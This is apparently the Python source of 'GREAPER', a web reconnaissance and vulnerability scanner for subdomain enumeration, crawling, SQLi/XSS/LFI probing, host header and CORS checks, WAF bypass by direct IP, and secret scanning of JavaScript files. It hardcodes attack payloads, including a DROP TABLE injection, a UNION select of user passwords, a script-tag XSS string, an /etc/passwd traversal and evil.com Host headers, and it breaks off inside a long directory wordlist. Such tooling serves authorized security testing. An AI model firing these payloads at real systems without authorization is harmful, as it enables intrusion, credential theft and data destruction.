#!/usr/bin/env python3

import os
import pyfiglet
import random
import requests
from bs4 import BeautifulSoup
import argparse
import dns.resolver
import socket
import time
import re
import sys
import json
import subprocess
import concurrent.futures
from urllib.parse import urlparse, urljoin

# ANSI escape codes for colors
COLOR_GREEN = "\033[92m"
COLOR_RED = "\033[91m"
COLOR_ORANGE = "\033[93m"
COLOR_PURPLE = "\033[95m"
COLOR_YELLOW = "\033[93m"
COLOR_BLUE = "\033[94m"
COLOR_GREY = "\033[90m"
COLOR_RESET = "\033[0m"

# List of available fonts in pyfiglet
available_fonts = pyfiglet.FigletFont.getFonts()

# List of ANSI color codes
color_codes = [31, 32, 33, 34, 35, 36, 91, 92, 93, 94, 95, 96]

# Randomly select a font and a color
font = random.choice(available_fonts)
color_code = random.choice(color_codes)

# Create ASCII art with the chosen font
ascii_art = pyfiglet.figlet_format("GREAPER", font=font, width=80)

# Apply ANSI escape codes for the chosen color
colored_ascii = f"\033[{color_code}m{ascii_art}\033[0m"

# Print the colored ASCII art
print(colored_ascii)
print(" " * 2 + "made by algorethm")

def save_results(output_file, results):
    if output_file:
        with open(output_file, 'a') as f:
            for result in results:
                f.write(result + '\n')
        print(f"{COLOR_GREEN}[+] Results saved to {output_file}{COLOR_RESET}")
        
def color_status_code(status_code):
    if 200 <= status_code < 300:
        return COLOR_GREEN
    elif 300 <= status_code < 400:
        return COLOR_PURPLE
    elif 400 <= status_code < 500:
        return COLOR_BLUE
    elif 500 <= status_code < 600:
        return COLOR_RED
    return COLOR_GREY

def fetch_wayback_urls(domain):
    try:
        print(f"[*] Fetching Wayback Machine URLs for {domain}")
        response = requests.get(f"http://web.archive.org/cdx/search/cdx?url=*.{domain}/*&output=json&fl=original&collapse=urlkey")
        if response.status_code == 200:
            urls = [entry[0] for entry in response.json()]
            return set(urls)
    except Exception as e:
        print(f"{COLOR_ORANGE}[-] Error fetching Wayback URLs: {str(e)}{COLOR_RESET}")
    return set()

def fetch_gau_urls(domain):
    try:
        print(f"[*] Fetching URLs from gau for {domain}")
        response = requests.get(f"https://gau.tools/{domain}")
        if response.status_code == 200:
            urls = response.text.splitlines()
            return set(urls)
    except Exception as e:
        print(f"{COLOR_ORANGE}[-] Error fetching gau URLs: {str(e)}{COLOR_RESET}")
    return set()

def fetch_commoncrawl_urls(domain):
    try:
        print(f"[*] Fetching URLs from Common Crawl for {domain}")
        response = requests.get(f"http://index.commoncrawl.org/CC-MAIN-2023-27-index?url={domain}/*&output=json")
        if response.status_code == 200:
            entries = response.json()
            urls = [entry.get('url') for entry in entries]
            return set(urls)
    except Exception as e:
        print(f"{COLOR_ORANGE}[-] Error fetching Common Crawl URLs: {str(e)}{COLOR_RESET}")
    return set()

def crawl_site(url, depth=1, current_depth=1, crawled_urls=set(), domain=None):
    if not domain:
        domain = urlparse(url).netloc
    
    print(f"[*] Crawling URL: {url} (Depth: {current_depth}/{depth})")
    try:
        response = requests.get(url, timeout=5)
        soup = BeautifulSoup(response.content, 'html.parser')
        links = set()

        # Find all <a> tags, script sources, stylesheets, json files, compressed files, etc.
        for tag in soup.find_all(['a', 'script', 'link']):
            if tag.name == 'a' and tag.get('href'):
                link = tag.get('href')
            elif tag.name == 'script' and tag.get('src'):
                link = tag.get('src')
            elif tag.name == 'link' and tag.get('href'):
                link = tag.get('href')
            else:
                continue
            
            full_link = urljoin(url, link)  # Ensure relative links are converted to full URLs
            if full_link.startswith("http") and domain in full_link:
                links.add(full_link)

        # Also look for specific file types that could be of interest (e.g., .txt, .json, .js, .zip, etc.)
        file_types = ['.txt', '.json', '.js', '.zip', '.tar.gz', '.sql', '.csv', '.xml', '.graphql', '.env', '.yml', '.pdf', '.doc', '.xls', '.config']
        for file_type in file_types:
            for link in soup.find_all('a', href=re.compile(f".*{file_type}$")):
                full_link = urljoin(url, link.get('href'))
                if full_link.startswith("http") and domain in full_link:
                    links.add(full_link)

        print(f"[*] Found {len(links)} links on {url}")

        if not links:
            print(f"{COLOR_RED}[-] No links found on {url}{COLOR_RESET}")
        
        for link in links:
            if link not in crawled_urls:
                print(f"{COLOR_GREEN}[+] {link}{COLOR_RESET}")
                crawled_urls.add(link)

        if current_depth < depth:
            for link in links:
                if link not in crawled_urls:
                    crawl_site(link, depth=depth, current_depth=current_depth + 1, crawled_urls=crawled_urls, domain=domain)
    except requests.RequestException as e:
        print(f"{COLOR_ORANGE}[-] Error crawling {url}: {str(e)}{COLOR_RESET}")
    
    return crawled_urls

def enhanced_crawl(url, depth=1, crawled_urls=set(), domain=None):
    if not domain:
        domain = urlparse(url).netloc
    
    wayback_urls = fetch_wayback_urls(domain)
    gau_urls = fetch_gau_urls(domain)
    commoncrawl_urls = fetch_commoncrawl_urls(domain)

    combined_urls = wayback_urls.union(gau_urls).union(commoncrawl_urls)

    print(f"[*] Found {len(combined_urls)} URLs using Wayback, gau, and Common Crawl.")
    
    for link in combined_urls:
        if link not in crawled_urls:
            print(f"{COLOR_GREEN}[+] {link}{COLOR_RESET}")
            crawled_urls.add(link)

    # Perform a regular crawl after fetching these URLs
    return crawl_site(url, depth=depth, crawled_urls=crawled_urls, domain=domain)

def get_content_length(url, output_file=None):
    print(f"[*] Fetching Content Length for {url}")
    try:
        response = requests.get(url, timeout=5)
        content_length = response.headers.get('Content-Length')
        if content_length:
            size_in_kb = int(content_length) / 1024
            size_str = f"{size_in_kb:.2f}kb" if size_in_kb >= 1 else f"{int(content_length)}b"
        else:
            size_str = f"{len(response.content) / 1024:.2f}kb"
        result = f"{COLOR_GREEN}[+] {url} [{size_str}]{COLOR_RESET}"
        print(result)
        save_results(output_file, [result])
    except requests.RequestException as e:
        print(f"{COLOR_ORANGE}[-] Error fetching Content Length for {url}: {str(e)}{COLOR_RESET}")

def check_live_urls(url, output_file=None):
    print(f"[*] Probing for live protocol of {url}")
    found_live = False
    try:
        for protocol in ['https://', 'http://']:
            full_url = protocol + url
            response = requests.get(full_url, timeout=5)
            status_code = response.status_code
            if 200 <= status_code < 400:  # Consider live for 2xx and 3xx status codes
                result = f"{COLOR_GREEN}{full_url}{COLOR_RESET}"
                print(result)
                save_results(output_file, [result])
                found_live = True
                break  # Exit once a live protocol is found
    except requests.RequestException as e:
        print(f"{COLOR_ORANGE}[-] Error probing {url}: {str(e)}{COLOR_RESET}")

    if not found_live:
        print(f"{COLOR_RED}[-] No live protocols found for {url}{COLOR_RESET}")

def check_status_code(url, output_file=None):
    print(f"[*] Checking status code for {url}")
    try:
        response = requests.get(url, timeout=5)
        status_code = response.status_code
        color = COLOR_GREEN if 200 <= status_code < 300 else (
            COLOR_YELLOW if 300 <= status_code < 400 else (
                COLOR_PURPLE if 400 <= status_code < 500 else COLOR_RED))
        result = f"{color}{url} [{status_code}]{COLOR_RESET}"
        print(result)
        save_results(output_file, [result])
    except requests.RequestException as e:
        print(f"{COLOR_ORANGE}[-] Error checking status code for {url}: {str(e)}{COLOR_RESET}")

def get_subdomains_from_crtsh(domain):
    print(f"[*] Fetching subdomains from crt.sh for {domain}")
    try:
        response = requests.get(f"https://crt.sh/?q=%25.{domain}&output=json")
        subdomains = set()
        if response.status_code == 200:
            certs = response.json()
            for cert in certs:
                if "name_value" in cert:
                    subdomains.update(cert['name_value'].splitlines())
        return list(subdomains)
    except Exception as e:
        print(f"{COLOR_ORANGE}[-] Error fetching subdomains from crt.sh: {str(e)}{COLOR_RESET}")
        return []

def get_subdomains_from_google(domain):
    print(f"[*] Fetching subdomains from Google for {domain}")
    subdomains = []
    query = f"site:{domain} -www"
    try:
        search_url = f"https://www.google.com/search?q={query}&num=100"
        headers = {'User-Agent': 'Mozilla/5.0'}
        response = requests.get(search_url, headers=headers)
        if response.status_code == 200:
            soup = BeautifulSoup(response.content, 'html.parser')
            for a_tag in soup.find_all('a'):
                href = a_tag.get('href')
                if href and domain in href:
                    subdomain = re.search(r'https?://([a-zA-Z0-9.-]+)', href)
                    if subdomain:
                        subdomains.append(subdomain.group(1))
    except Exception as e:
        print(f"{COLOR_ORANGE}[-] Error fetching subdomains from Google: {str(e)}{COLOR_RESET}")
    return subdomains

def enumerate_subdomains(url=None, output_file=None, rate_limit=3):
    print(f"[*] Starting subdomain enumeration for {url}")

    common_subdomains = [
        "www", "mail", "webmail", "admin", "ftp", "test", "api", "app", "support", "portal",
        "login", "dev", "staging", "secure", "test-api", "app-api", "blog", "info", "docs", 
        "static", "assets", "downloads", "mobile", "store", "devops", "erp", "crm", "jira",
        "jenkins", "hub", "docker", "qa", "prod", "backoffice", "vpn", "intranet", "extranet"
    ]
    
    subdomains_found = set()

    for subdomain in common_subdomains:
        full_url = f"http://{subdomain}.{url}"
        try:
            response = requests.get(full_url)
            if response.status_code == 200:
                print(f"{COLOR_GREEN}[+] Found subdomain: {full_url}{COLOR_RESET}")
                subdomains_found.add(full_url)
        except requests.ConnectionError:
            pass
        time.sleep(rate_limit)

    subdomains_found.update(get_subdomains_from_crtsh(url))
    subdomains_found.update(get_subdomains_from_google(url))

    if not subdomains_found:
        print(f"{COLOR_RED}[-] No subdomains found for {url}{COLOR_RESET}")
    save_results(output_file, subdomains_found)

    return list(subdomains_found)

def greaper_sqli_scanner(target, payload_file=None, output_file=None):
    print(f"[*] Running Greaper SQLi scan on {target}")
    
    sqli_payloads = [
        "' OR 1=1 --", '" OR 1=1 --', "' AND 1=1 --", "' UNION SELECT NULL --",
        "' UNION SELECT username, password FROM users --", "' OR SLEEP(5) --",
        "' ORDER BY 1 --", "'; DROP TABLE users --", "'; WAITFOR DELAY '0:0:5' --"
    ]

    if payload_file:
        payload_file = os.path.expanduser(payload_file)
        if os.path.isfile(payload_file):
            with open(payload_file, 'r') as file:
                sqli_payloads.extend([line.strip() for line in file.readlines()])
        else:
            print(f"{COLOR_ORANGE}[-] Payload file '{payload_file}' not found.{COLOR_RESET}")

    found_sqli = False
    results = []
    for payload in sqli_payloads:
        sqli_test_url = target.replace("FUZZ", payload)
        try:
            response = requests.get(sqli_test_url)
            if "syntax error" in response.text.lower() or "sql" in response.text.lower():
                result = f"{COLOR_GREEN}[+] Potential SQLi found on {sqli_test_url} with payload: {payload}{COLOR_RESET}"
                print(result)
                found_sqli = True
                results.append(result)
            else:
                print(f"{COLOR_RED}[-] No SQLi found for payload: {payload}{COLOR_RESET}")
        except requests.RequestException as e:
            print(f"{COLOR_ORANGE}[-] Error scanning {sqli_test_url}: {str(e)}{COLOR_RESET}")

    if not found_sqli:
        print(f"{COLOR_RED}[-] No SQLi vulnerabilities found.{COLOR_RESET}")
    
    save_results(output_file, results)

def greaper_xss_scanner(target, payload_file, output_file=None):
    print(f"[*] Running Greaper XSS scan on {target}")
    payload_file = os.path.expanduser(payload_file)
    
    if not os.path.isfile(payload_file):
        print(f"{COLOR_ORANGE}[-] Payload file '{payload_file}' not found.{COLOR_RESET}")
        return
    
    try:
        with open(payload_file, 'r') as file:
            payloads = [line.strip() for line in file.readlines()]
    except Exception as e:
        print(f"{COLOR_ORANGE}[-] Error reading payload file: {str(e)}{COLOR_RESET}")
        return
    
    found_xss = False
    results = []
    for payload in payloads:
        encoded_payload = requests.utils.quote(payload)
        xss_test_url = target.replace("FUZZ", encoded_payload)
        
        try:
            response = requests.get(xss_test_url)
            if payload in response.text:
                result = f"{COLOR_GREEN}[+] XSS found on {xss_test_url} with payload: {payload}{COLOR_RESET}"
                print(result)
                found_xss = True
                results.append(result)
            else:
                print(f"{COLOR_RED}[-] No XSS found for payload: {payload}{COLOR_RESET}")
        except requests.RequestException as e:
            print(f"{COLOR_ORANGE}[-] Error scanning {xss_test_url}: {str(e)}{COLOR_RESET}")

    if not found_xss:
        print(f"{COLOR_RED}[-] No XSS vulnerabilities found.{COLOR_RESET}")
    
    save_results(output_file, results)


def greaper_lfi_scanner(target, payload_file, output_file=None):
    print(f"[*] Running Greaper LFI scan on {target}")
    payload_file = os.path.expanduser(payload_file)

    if not os.path.isfile(payload_file):
        print(f"{COLOR_ORANGE}[-] Payload file '{payload_file}' not found.{COLOR_RESET}")
        return

    try:
        with open(payload_file, 'r') as file:
            payloads = [line.strip() for line in file.readlines()]
    except Exception as e:
        print(f"{COLOR_ORANGE}[-] Error reading payload file: {str(e)}{COLOR_RESET}")
        return

    found_lfi = False
    results = []
    for payload in payloads:
        lfi_test_url = target.replace("FUZZ", payload)
        try:
            response = requests.get(lfi_test_url)
            if "root:" in response.text or "error" in response.text.lower():
                result = f"{COLOR_GREEN}[+] Potential LFI found on {lfi_test_url} with file: {payload}{COLOR_RESET}"
                print(result)
                found_lfi = True
                results.append(result)
            else:
                print(f"{COLOR_RED}[-] No LFI found for file: {payload}{COLOR_RESET}")
        except requests.RequestException as e:
            print(f"{COLOR_ORANGE}[-] Error scanning {lfi_test_url}: {str(e)}{COLOR_RESET}")

    if not found_lfi:
        print(f"{COLOR_RED}[-] No LFI vulnerabilities found.{COLOR_RESET}")
    
    save_results(output_file, results)

def dynamic_payload_generator(target, output_file=None):
    print(f"[*] Running Greaper Dynamic Payload Generation on {target}")
    
    try:
        response = requests.get(target)
        soup = BeautifulSoup(response.content, 'html.parser')

        forms = soup.find_all('form')
        print(f"[*] Found {len(forms)} forms on the page.")

        if not forms:
            print(f"{COLOR_RED}[-] No forms found on {target}{COLOR_RESET}")

        results = []
        for form in forms:
            action = form.get('action') or target
            method = form.get('method', 'get').lower()

            inputs = form.find_all('input')
            print(f"[*] Form action: {action}, method: {method}")

            for input_tag in inputs:
                input_name = input_tag.get('name')
                input_type = input_tag.get('type', 'text')
                
                if input_type == 'text':
                    payload = "<script>alert(1)</script>"
                    result = f"{COLOR_GREEN}[+] Generated XSS payload for input '{input_name}': {payload}{COLOR_RESET}"
                    print(result)
                    results.append(result)
                elif input_type == 'number':
                    payload = "' OR 1=1 --"
                    result = f"{COLOR_GREEN}[+] Generated SQLi payload for input '{input_name}': {payload}{COLOR_RESET}"
                    print(result)
                    results.append(result)
                elif input_type == 'file':
                    payload = "../../../../etc/passwd"
                    result = f"{COLOR_GREEN}[+] Generated LFI payload for input '{input_name}': {payload}{COLOR_RESET}"
                    print(result)
                    results.append(result)
                else:
                    payload = "FUZZ"
                    result = f"{COLOR_GREEN}[+] Generated default payload for input '{input_name}': {payload}{COLOR_RESET}"
                    print(result)
                    results.append(result)

        save_results(output_file, results)
    except requests.RequestException as e:
        print(f"{COLOR_ORANGE}[-] Error crawling the site: {str(e)}{COLOR_RESET}")

def greaper_host_header_scan(target, output_file=None):
    print(f"[*] Running Host Header Injection scan on {target}")
    headers = {
        'Host': 'evil.com',
        'X-Forwarded-Host': 'evil.com'
    }
    found_hhi = False
    results = []
    try:
        response = requests.get(target, headers=headers)
        if 'evil.com' in response.text or 'evil.com' in response.headers.values():
            result = f"{COLOR_GREEN}[+] Host Header Injection found on {target}{COLOR_RESET}"
            print(result)
            found_hhi = True
            results.append(result)
        else:
            print(f"{COLOR_RED}[-] No Host Header Injection found on {target}{COLOR_RESET}")
    except requests.RequestException as e:
        print(f"{COLOR_ORANGE}[-] Error scanning {target}: {str(e)}{COLOR_RESET}")

    if not found_hhi:
        print(f"{COLOR_RED}[-] No Host Header Injection vulnerabilities found.{COLOR_RESET}")
    
    save_results(output_file, results)

def greaper_cors_scan(target, output_file=None):
    print(f"[*] Running CORS Misconfiguration scan on {target}")
    found_cors = False
    results = []
    try:
        response = requests.get(target)
        if 'Access-Control-Allow-Origin' in response.headers:
            allowed_origins = response.headers['Access-Control-Allow-Origin']
            if '*' in allowed_origins or 'null' in allowed_origins:
                result = f"{COLOR_GREEN}[+] Potential CORS Misconfiguration on {target}: {allowed_origins}{COLOR_RESET}"
                print(result)
                found_cors = True
                results.append(result)
            else:
                print(f"{COLOR_RED}[-] No risky CORS configuration found on {target}{COLOR_RESET}")
        else:
            print(f"{COLOR_RED}[-] No CORS headers found on {target}{COLOR_RESET}")
    except requests.RequestException as e:
        print(f"{COLOR_ORANGE}[-] Error scanning {target}: {str(e)}{COLOR_RESET}")

    if not found_cors:
        print(f"{COLOR_RED}[-] No CORS Misconfiguration vulnerabilities found.{COLOR_RESET}")
    
    save_results(output_file, results)

def greaper_ip_lookup_bypass(target, output_file=None):
    print(f"[*] Performing advanced IP lookup for {target}")
    results = []
    try:
        ip = socket.gethostbyname(target)
        result = f"{COLOR_GREEN}[+] IP address of {target}: {ip}{COLOR_RESET}"
        print(result)
        headers = {'Host': target}

        # Attempt to bypass Cloudflare or WAF by sending requests directly to the IP address
        response = requests.get(f"http://{ip}", headers=headers, timeout=10)
        if response.status_code == 200:
            result = f"{COLOR_GREEN}[+] Direct IP access successful: {ip}{COLOR_RESET}"
            results.append(result)
        else:
            print(f"{COLOR_RED}[-] Direct IP access failed: {response.status_code}{COLOR_RESET}")
    except socket.gaierror:
        print(f"{COLOR_ORANGE}[-] Unable to resolve IP for {target}{COLOR_RESET}")
    except requests.RequestException as e:
        print(f"{COLOR_ORANGE}[-] Error attempting direct IP access: {str(e)}{COLOR_RESET}")

    save_results(output_file, results)


def scan_js_files(url, output_file=None):
    print(f"[*] Scanning JavaScript files for potential issues on {url}")
    try:
        response = requests.get(url)
        soup = BeautifulSoup(response.content, 'html.parser')

        # Find all script tags with src attribute (which are JS files)
        scripts = soup.find_all('script', src=True)
        js_urls = []
        for script in scripts:
            js_url = script['src']
            if js_url.startswith('/'):
                js_url = urljoin(url, js_url)  # Complete relative URLs to absolute URLs
            js_urls.append(js_url)

        if js_urls:
            print(f"[+] Found {len(js_urls)} JavaScript files on {url}:")
            for js_url in js_urls:
                print(f" - {js_url}")
                analyze_js(js_url, output_file)
        else:
            print(f"{COLOR_RED}[-] No JavaScript files found on {url}{COLOR_RESET}")
    except Exception as e:
        print(f"{COLOR_ORANGE}[-] Error fetching JavaScript files: {str(e)}{COLOR_RESET}")

def analyze_js(js_url, output_file=None):
    try:
        response = requests.get(js_url)
        if response.status_code == 200:
            js_content = response.text
            # Enhanced patterns for sensitive data
            patterns = {
                'API Key': r'api_key["\']?\s*[:=]\s*["\'][A-Za-z0-9-_]{20,}',
                'Token': r'token["\']?\s*[:=]\s*["\'][A-Za-z0-9-_]{20,}',
                'Auth URL': r'https?://[a-zA-Z0-9-_.]+/auth/[a-zA-Z0-9-_/]+',
                'API Endpoints': r'https?://[a-zA-Z0-9-_.]+/api/[a-zA-Z0-9-_/]+',
                'AWS Key': r'AKIA[0-9A-Z]{16}',
                'Private Key': r'-----BEGIN PRIVATE KEY-----',
                'JWT': r'[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+',
                'Base64': r'[A-Za-z0-9+/]{32,}={0,2}'
            }
            found_issues = []

            # Search the JS file for each pattern
            for issue, pattern in patterns.items():
                matches = re.findall(pattern, js_content)
                if matches:
                    found_issues.append(f"{issue}: {matches}")

            if found_issues:
                result = f"{COLOR_GREEN}[+] Sensitive info found in JS file {js_url}:\n" + "\n".join(found_issues) + COLOR_RESET
                print(result)
                if output_file:
                    save_results(output_file, [result])
            else:
                print(f"{COLOR_RED}[-] No sensitive info found in JS file {js_url}{COLOR_RESET}")
        else:
            print(f"{COLOR_RED}[-] Error fetching JS file {js_url}: {response.status_code}{COLOR_RESET}")
    except Exception as e:
        print(f"{COLOR_ORANGE}[-] Error analyzing JS file {js_url}: {str(e)}{COLOR_RESET}")

def check_security_headers(url, output_file=None):
    print(f"[*] Checking security headers for {url}")
    try:
        response = requests.get(url, timeout=5)
        headers = response.headers
        required_headers = [
            'Strict-Transport-Security', 'Content-Security-Policy', 'X-Frame-Options', 
            'X-Content-Type-Options', 'Referrer-Policy', 'Permissions-Policy', 'X-XSS-Protection'
        ]
        results = [f"{url}"]
        for header in required_headers:
            if header in headers:
                result = f"{COLOR_GREEN}[+] {header} is set: {headers[header]}{COLOR_RESET}"
                print(result)
                results.append(result)
            else:
                result = f"{COLOR_ORANGE}[-] {header} is missing{COLOR_RESET}"
                print(result)
                results.append(result)

        save_results(output_file, results)
    except requests.RequestException as e:
        print(f"{COLOR_ORANGE}[-] Error checking security headers: {str(e)}{COLOR_RESET}")

def cve_scan_by_fingerprint(url, output_file=None):
    print(f"[*] Running CVE scan based on server fingerprint for {url}")
    try:
        response = requests.get(url, timeout=5)
        server_header = response.headers.get('Server')
        if server_header:
            print(f"[*] Detected server: {server_header}")
            cve_search_url = f"https://cve.circl.lu/api/search/{server_header}"
            cve_response = requests.get(cve_search_url)
            if cve_response.status_code == 200:
                cve_data = cve_response.json()
                if cve_data['results']:
                    print(f"{COLOR_GREEN}[+] Found potential CVEs for {server_header}:{COLOR_RESET}")
                    for cve in cve_data['results']:
                        result = f"    - {cve['id']}: {cve['summary']}"
                        print(result)
                        save_results(output_file, [result])
                else:
                    print(f"{COLOR_RED}[-] No known CVEs found for {server_header}{COLOR_RESET}")
        else:
            print(f"{COLOR_RED}[-] No server information found for {url}{COLOR_RESET}")
    except requests.RequestException as e:
        print(f"{COLOR_ORANGE}[-] Error scanning {url} for CVEs: {str(e)}{COLOR_RESET}")


def directory_fuzz(target, output_file=None, payload_file=None):
    print(f"[*] Starting directory fuzzing on {target}")

    if payload_file:
        try:
            with open(payload_file, 'r') as f:
                # Skip lines starting with "#" and empty lines
                directories = [line.strip() for line in f if line.strip() and not line.startswith('#')]
            print(f"{COLOR_PURPLE}[*] Loaded {len(directories)} directories from payload file '{payload_file}'{COLOR_RESET}")
        except FileNotFoundError:
            print(f"{COLOR_RED}[-] Payload file '{payload_file}' not found.{COLOR_RESET}")
            return
    else:
        directories = [
            "download58", "image3.xml", "download85.css", "test54.jpg", "test49.css", "service75", "user86", "test43", "backup68.js", "example33", "config35.json", "config91.html", "login79", "backup77.js", "service41.xml", "login1.php", "config32", "user75.json", "service61", "download93", "config8", "download62", "image15.css", "test16", "login70.html", "test53.png", "config74.js", "config60", "test91.html", "user31", "admin90.xml", "test36.jpg", "login56", "login59.json", "config64.html", "login95.json", "download65.css", "example2", "backup77.xml", "user92.html", "user22.xml", "login26", "admin30", "test44", "config56.png", "backup69.xml", "login98", "test6", "backup38.json", "image14", "admin29", "login66.xml", "user100", "login39", "service30.xml", "test11", "user58", "backup13", "image19", "example4", "test74.json", "service3", "backup51", "example46", "download49", "config35.png", "login81", "admin10.json", "image96", "backup70.php", "login24.css", "test49.js", "image56", "service43.js", "user94.xml", "example57", "login76.json", "service100.json", "image54.png", "login67.zip", "example75", "service42.js", "login58", "download99", "login53.jpg", "service92.js", "example55", "test76", "service18", "backup78", "example44", "admin87", "login2", "test32", "admin67", "example4", "test66", "download11", "config34", "example4.zip", "config97", "config14.json", "example91", "admin100.zip", "config95.php", "image15", "download13", "example25", "test65", "user63.json", "config39.html", "config97.json", "test83.jpg", "login88", "user10.js", "example50", "image6", "test89.css", "config90", "admin44.json", "login100", "backup55.zip", "backup63", "download74.jpg", "example99.png", "admin32", "service82", "service81.html", "admin40.html", "example93.php", "download54", "config9", "config39", "login8", "admin79", "user64", "download34.css", "login26", "example9", "service87", "service73", "admin3", "example49.js", "config18.php", "admin19", "test99.css", "backup54.jpg", "login66.html", "service99.html", "user98.jpg", "config53.php", "image26", "service90.json", "image42.html", "example19", "service86.zip", "config44.php", "test56", "user91", "login95", "test63.xml", "test83", "service4.php", "download15.json", "login19", "test30", "service73.html", "config16.js", "download54", "test90", "login72", "test51", "backup35", "download57", "service72", "image10", "image31", "service47", "backup64.js", "backup9", "service92", "config69.html", "service34.css", "backup95.html", "test4", "admin16.html", "image18.xml", "login11", "user24", "service64.css", "test46.zip", "backup31", "test20.php", "login24", "service38", "service60", "admin20.php", "example12", "download59", "backup67", "image79", "config55.html", "config64", "backup68.html", "admin32", "user39.js", "backup70", "example93.jpg", "login96.html", "download58", "config76", "service16", "test28", "image92", "admin20.zip", "admin92.php", "login35.js", "example38.jpg", "download71", "user39.zip", "config88.png", "config38", "config95.jpg", "service66.xml", "backup77", "admin70.png", "test84.jpg", "example100.zip", "image96", "example40", "admin25.png", "service42", "admin82", "image42", "example18", "backup99", "test52", "login66.html", "config7", "user82.jpg", "backup60", "config50", "download71", "user51", "example93.php", "admin12.css", "download42", "config92", "test48", "image59.html", "service4", "example12", "user8", "download28", "user31.php", "example20.js", "config76", "backup33", "service71", "service24.js", "user43.php", "user96.html", "download72", "example71.xml", "backup54", "login15", "example99", "test43", "config63", "config47.html", "user90.xml", "image55", "login2", "service51", "login18.jpg", "image60", "config29", "backup55.jpg", "config48", "image75", "backup9.js", "backup77", "download87.jpg", "user8.png", "config72", "test21.png", "example35.zip", "download69", "config10", "config4", "test45", "login84", "admin13", "example84.html", "service26", "test31", "user7", "config34", "image85.php", "download61", "example25", "config9", "service91.zip", "user53", "example51", "image80.css", "download10", "service24", "backup38", "test63.json", "service15", "backup69.php", "config92.css", "user19", "backup52", "download50", "image12", "test98", "user59", "login25", "example77", "service74", "download40", "backup44.png", "config37", "admin90", "admin61", "test92", "image37", "user30", "backup66.zip", "config79.zip", "example6", "example91.zip", "user50", "config39.zip", "download39.jpg", "download82.js", "backup65", "test2", "admin40", "example19", "login98", "user92.zip", "example91", "backup62", "admin82", "image36.zip", "admin40", "image47", "image93", "example88", "config90", "image58", "service93.js", "user93", "example87.css", "image34", "login69", "user100.xml", "config8.css", "backup5", "service50", "download96.png", "image39", "config2.php", "service7.png", "admin69", "service67.jpg", "login76", "login14", "service95.php", "backup84", "download51.html", "user49", "service81.png", "example61", "backup46.xml", "test96.css", "download40", "backup93", "config13", "service91.xml", "user88", "test98.jpg", "download74", "download25.js", "user39", "config7", "service16.jpg", "example36.js", "service40", "example69", "user1.xml", "download72", "service58", "user19.png", "test46", "admin64", "image45", "example35", "image56", "service14.zip", "backup72.css", "service94", "backup64.js", "image40", "login29.php", "image44.xml", "download79.css", "image10", "login99", "backup18", "example61.xml", "admin42", "login46.php", "login10.css", "download58.png", "image33.css", "download54", "image3.jpg", "config63.json", "download33.zip", "config79", "login44.jpg", "backup12", "service34.html", "test98", "user94.js", "example73.php", "download64.zip", "login78.html", "backup46", "image53.js", "user83", "user100.html", "example6", "login83", "admin5.css", "example36.php", "admin35", "backup75.php", "login17", "login69", "user12", "backup13.jpg", "user77.json", "login91", "example98.xml", "test1.json", "image41", "admin49.zip", "login95.png", "login83", "login10", "service45", "example44", "admin2.png", "test88", "admin7.js", "login21.php", "login77.html", "image67.html", "admin12.json", "service33.jpg", "login84", "image30.json", "test24.css", "user26.xml", "service97.png", "example69", "login28", "image2.png", "backup57", "example67.php", "login67", "admin65.png", "example92.jpg", "example84.js", "user43", "download11.html", "download39", "test77.js", "backup23.zip", "user24.css", "test20.html", "service19", "config57.jpg", "config88", "download71.zip", "config81.zip", "service65", "test48", "test19.css", "login71", "config66.json", "download87", "user19.xml", "login16.json", "example54.js", "image46", "config75.json", "admin44", "login78", "test95", "user54.json", "config76", "login18", "test66.json", "download40", "test9.js", "service41", "service10.xml", "login42", "config84.zip", "download92", "login36.css", "image64", "test72.xml", "test86", "config17.zip", "backup78", "login77", "user66.php", "image1", "config5.json", "admin69.png", "backup15.json", "backup49.zip", "service99.js", "service33", "config79", "user66", "backup97", "image41", "admin91", "config48", "service71.json", "test95.css", "backup24", "login34.css", "service59.png", "download49.html", "backup75", "backup33.php", "login24", "login22", "service51.png", "admin99.jpg", "example39.json", "config5", "admin96", "image16", "example92", "download14.json", "user16", "service78", "config77", "config17.xml", "user44.js", "user5", "config49.php", "backup36.json", "service61", "service3", "example73", "download4", "login79.js", "backup92.png", "service23.html", "admin24.js", "download91", "backup62", "admin67", "image65", "download34", "user46", "download2", "service24", "example64", "download94", "download66.png", "config37.jpg", "user61", "login54.png", "service31", "test4.css", "config22", "example51.png", "user66", "user59", "user34.zip", "login77", "login2.xml", "download9", "test16.xml", "service59", "example33", "service75", "login82", "backup62", "download73.zip", "example72.js", "backup59.png", "user8.php", "config87.xml", "config43.zip", "user33", "config21", "admin65.php", "admin96.js", "login80", "example6.php", "image45", "download80", "test1.json", "test99", "config32", "download66.php", "download71", "config12.zip", "example3.png", "test69.zip", "config29.jpg", "admin53", "login64", "config88.html", "user76.jpg", "image48", "login27.png", "image58", "test57", "example47.png", "admin67", "login16", "download91.zip", "backup4.json", "backup62", "image6", "image11.php", "download75", "config95.xml", "image65", "config70", "config11.js", "user24", "download4.php", "admin63", "user67", "admin84", "example54", "example11", "service82.html", "login29.json", "example60.php", "service99", "user70", "config25.json", "image95", "test61.jpg", "backup92.js", "user22", "backup55", "user28", "image44.php", "download70", "example94.json", "service23", "login9.xml", "admin29.json", "service63", "example57", "admin66", "login35.zip", "example23.png", "backup90", "download54.json", "config66", "backup61", "example75.json", "admin68", "service47", "user5.json", "login31.png", "service36", "login43.php", "example72.json", "image86.png", "config4.php", "user87.php", "config3", "test93", "example88", "download25", "image69", "image100", "login82", "admin75.png", "config94", "login63.css", "user77", "config87.js", "login50.css", "config29.png", "config25", "config46", "admin67.php", "user62.html", "backup79", "service72", "backup59", "admin59.js", "example74", "admin70", "download29", "config29", "test7.json", "login62.css", "service80.png", "example49", "service30", "admin80.php", "example60", "example38.css", "backup62.jpg", "backup2", "test34.xml", "login37", "test74.png", "image46.js", "example44.js", "admin8", "image8", "image83.png", "config6", "config91.jpg", "download36", "service3", "image49", "download45.js", "config5", "config88", "test19.zip", "login3", "backup20", "example86", "service74", "service35", "config11", "test63", "image58.jpg", "admin100.xml", "service94", "login29.json", "config43.xml", "example41", "service62.jpg", "user80", "backup10.xml", "user2", "backup46", "backup100.jpg", "config24.zip", "download15.png", "admin28", "image63", "admin68", "test46", "backup67", "user23", "backup28", "admin97", "user95", "image27.css", "user40.php", "user22", "login87", "service52", "service38.json", "example84", "login35", "backup60.jpg", "backup99", "user97.jpg", "backup66.css", "user85.js", "user86.html", "test48", "config89.zip", "test91", "config100", "test58.json", "image18", "user56.xml", "download66.css", 